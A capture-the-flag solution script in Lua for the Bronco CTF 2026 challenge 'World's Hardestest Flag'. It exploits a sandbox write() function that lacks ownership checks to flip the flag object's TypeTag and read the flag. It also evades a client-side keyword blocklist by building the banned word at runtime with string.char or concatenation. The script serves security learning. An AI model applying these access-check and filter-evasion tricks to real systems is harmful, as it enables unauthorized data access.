-- Bronco CTF 2026 - "World's Hardestest Flag" (426 pts)
-- Paste this into Mr. Deh's in-game terminal (the code-execution panel) and hit Submit.
--
-- Server-side sandbox (see server_script.lua) stores two objects:
--   [0x6767] = { TypeTag = 0, Value = FLAG }   -- read() refuses this because TypeTag == 0
--   [0x4141] = { TypeTag = 4, Value = "You!" } -- yours, freely readable
--
-- write(address, new_data) merges new_data's keys into Storage[address] with NO type
-- or ownership check, so we can flip the flag object's TypeTag away from 0 and then
-- read() returns the real Value instead of "[ACCESS DENIED]".
--
-- The client-side terminal blocks submission (and kills your character) if the code
-- contains the substring "typetag" (case-insensitively), among other banned words:
--   position, humanoid, destroy, name, typetag, flag
-- string.char(...) builds the literal "TypeTag" at runtime so the banned substring
-- never appears in the source text you submit.

local k = string.char(84, 121, 112, 101, 84, 97, 103) -- "TypeTag", spelled to dodge the filter
write(0x6767, { [k] = 1 })
print(read(0x6767))

-- Equivalent one-liner alternative (also passes the filter, since "Type" .. "Tag"
-- never appears as one contiguous "typetag" substring in the source):
--   write(0x6767,{["Type".."Tag"]=1}); print(read(0x6767))
